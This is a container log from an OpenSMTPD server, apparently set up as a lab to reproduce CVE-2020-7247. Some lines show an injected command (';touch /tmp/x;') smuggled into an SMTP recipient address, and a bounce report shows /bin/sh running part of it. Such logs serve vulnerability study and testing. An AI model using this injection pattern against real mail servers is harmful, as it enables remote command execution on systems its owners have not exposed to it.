cve-2020-7247-smtpd-1  | setup_peer: scheduler -> control[8] fd=4
cve-2020-7247-smtpd-1  | debug: queue: bouncing evp:aa0a158560193f26 as evp:aa0a158544470007
cve-2020-7247-smtpd-1  | debug: scheduler: evp:aa0a158544470007 scheduled (bounce)
cve-2020-7247-smtpd-1  | debug: bounce: new message aa0a1585
cve-2020-7247-smtpd-1  | debug: bounce: adding report aa0a158544470007: root@31e162e43153: "/bin/sh: 1: @31e162e43153: not found"
cve-2020-7247-smtpd-1  | debug: bounce: drain: nmessage=1 running=0
cve-2020-7247-smtpd-1  | debug: bounce: next message not ready yet
cve-2020-7247-smtpd-1  | debug: bounce: setting timer
cve-2020-7247-smtpd-1  | debug: bounce: timeout
cve-2020-7247-smtpd-1  | debug: bounce: drain: nmessage=1 running=0
cve-2020-7247-smtpd-1  | debug: bounce: requesting new enqueue socket...
cve-2020-7247-smtpd-1  | debug: bounce: enough sessions running
cve-2020-7247-smtpd-1  | 9aff58f411447bb0 smtp connected address=local host=31e162e43153
cve-2020-7247-smtpd-1  | debug: bounce: got enqueue socket 11
cve-2020-7247-smtpd-1  | debug: bounce: new session 0x5601af825210
cve-2020-7247-smtpd-1  | debug: bounce: 0x5601af825210: getting next message...
cve-2020-7247-smtpd-1  | debug: bounce: 0x5601af825210: found message aa0a1585
cve-2020-7247-smtpd-1  | 9aff58f411447bb0 smtp failed-command command="RCPT TO: <;touch /tmp/x;@31e162e43153>" result="501 5.1.3 Recipient address syntax error"
cve-2020-7247-smtpd-1  | warn: PermFail injecting failure report on message aa0a1585 to <;touch /tmp/x;@31e162e43153> for 1 envelope: 501 5.1.3 Recipient address syntax error
cve-2020-7247-smtpd-1  | 9aff58f411447bb0 smtp disconnected reason=quit
cve-2020-7247-smtpd-1  | debug: bounce: 0x5601af825210: deleting session
cve-2020-7247-smtpd-1  | debug: bounce: drain: nmessage=0 running=0
cve-2020-7247-smtpd-1  | debug: bounce: no more messages
cve-2020-7247-smtpd-1  | 9aff58f518311eb2 smtp connected address=192.168.56.1 host=<unknown>
cve-2020-7247-smtpd-1  | 9aff58f518311eb2 smtp disconnected reason=disconnect
